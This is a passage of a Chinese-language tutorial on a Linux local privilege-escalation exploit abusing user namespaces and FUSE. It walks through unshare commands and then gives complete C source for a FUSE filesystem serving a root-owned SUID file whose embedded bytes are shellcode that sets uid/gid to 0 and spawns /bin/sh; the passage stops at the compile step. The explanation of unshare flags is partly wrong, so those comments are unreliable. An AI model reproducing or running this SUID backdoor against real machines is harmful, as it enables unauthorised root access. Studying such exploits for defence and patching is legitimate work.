
## 用户命名空间与权限映射

```
ubuntu@ubuntu:~/Downloads/fuse$ unshare -Urm
# -U：创建一个新的用户命名空间。在新的用户命名空间中，用户和用户组的标识将与外部命名空间隔离，可以重新映射用户和用户组的标识。
# -r：创建一个新的挂载命名空间。在新的挂载命名空间中，文件系统的挂载点和挂载状态将与外部命名空间隔离，可以进行独立的挂载操作。
# -m：创建一个新的PID命名空间。在新的PID命名空间中，进程的PID将与外部命名空间隔离，可以独立地管理进程。
root@ubuntu:~/Downloads/fuse# whoami
root
root@ubuntu:~/Downloads/fuse# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
# 可以看到在新用户命名空间我们的权限映射为root
```

- (sudo) 创建`root`权限的新用户命名空间并查看权限

`--map-root-user` 能够指定创建的用户`uid`，需要`root`权限，并且创造的`root`用户能在用户命名空间之外也能执行特权操作

```
sudo unshare --user --map-root-user /bin/bash
```

输出如下：

```
ubuntu@ubuntu:~/Downloads/test_overlay$ sudo unshare --user --map-root-user /bin/bash
root@ubuntu:/home/ubuntu/Downloads/test_overlay# id
uid=0(root) gid=0(root) groups=0(root)
```

再对比一下在不同用户命名空间下文件的拥有者：

```
# uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
ubuntu@ubuntu:~/Downloads/test_overlay$ ls -al nobody.txt
-rw-rw-r-- 1 ubuntu ubuntu 0 May 10 20:56 nobody.txt
```

```
# uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
nobody@ubuntu:~/Downloads/test_overlay$ ls -al nobody.txt
-rw-rw-r-- 1 nobody nogroup 0 May 10 20:56 nobody.txt
```

### fuseFS 操作流程

我在漏洞的逻辑中提到了：`nosuid` 是在挂载时对文件系统进行了限制，但是文件系统可以生成一个 `suid` 的文件，即使因为限制不起作用。

我们在这里通过 `fuse` 文件系统创建一个文件，文件的要求如下：

1. 设置文件所有者为 `root`
2. 设置 `SUID` 权限位，`SUID` 权限位会让执行该文件的用户拥有与文件拥有者相同的权限

#### 创建 `fuse_suid` 程序

我们先创建一个符合上面要求的文件，后续再对符合要求的文件进行修改。首先安装依赖：

```
sudo apt-get install libfuse-dev
```

新建文件 `fuse_suid.c`，用来生成一个程序，运行程序后能够挂载 `fuseFS` 到一个空目录，挂载后目录下包含一个可执行文件 `hello`，执行 `hello` 中的命令获取 `shell`（此处使用 `chenaotian` 师傅的 [poc](https://bbs.kanxue.com/elink@912K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0K9r3g2F1j5h3!0@1K9h3q4F1i4K6u0r3b7#2k6q4i4K6u0V1x3U0l9J5x3#2)9J5k6o6l9K6z5o6j5`。））：

```c
#define FUSE_USE_VERSION 30
#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static const char *hello_path = "/hello";//fuse文件系统中有一个名为hello的文件，这里是文件路径
const char hello_str[] = {//fuse文件系统中的suid 后门文件的二进制内容
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x00, 0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05
};

static int hellofs_getattr(const char *path, struct stat *stbuf)//获取文件或目录的属性信息的回调函数 getattr
{
int res = 0;
memset(stbuf, 0, sizeof(struct stat));
if (strcmp(path, "/") == 0) {//fuse文件系统根目录的权限，0755
stbuf->st_mode = S_IFDIR | 0755;
stbuf->st_nlink = 2;
} else if (strcmp(path, hello_path) == 0) {//hello文件的权限，777并且带有SUID
stbuf->st_mode = S_IFREG | S_ISUID | 0777;
stbuf->st_nlink = 1;
stbuf->st_size = sizeof(hello_str);//hello文件实际大小
} else {
res = -ENOENT;
}
return res;
}

static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)//获取目录信息的函数
{
(void) offset;
(void) fi;
if (strcmp(path, "/") != 0) {//目前只支持查看fuse的根目录
return -ENOENT;
}
filler(buf, ".", NULL, 0);//默认显示.和..
filler(buf, "..", NULL, 0);
filler(buf, hello_path + 1, NULL, 0);//fuse根目录有一个hello文件
return 0;
}

static int hellofs_open(const char *path, struct fuse_file_info *fi)//打开文件的 open 回调函数
{
if (strcmp(path, hello_path) != 0) {//只支持打开hello文件
return -ENOENT;
}
return 0;
}

static int hellofs_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi)//读文件的回调函数read
{
size_t len;
(void) fi;
if (strcmp(path, hello_path) != 0) {//只支持读hello文件
return -ENOENT;
}
len = sizeof(hello_str);
if (offset < len) {
if (offset + size > len) {
size = len - offset;
}
memcpy(buf, hello_str + offset, size);//返回hello文件的内容，即上面的二进制数组
} else {
size = 0;
}
return size;
}

static struct fuse_operations hellofs_oper = {//只实现上述四个回调函数已经够了
.getattr = hellofs_getattr,
.readdir = hellofs_readdir,
.open = hellofs_open,
.read = hellofs_read,
};

int main(int argc, char *argv[])
{
return fuse_main(argc, argv, &hellofs_oper, NULL);//注册回调函数
}
```

编译：
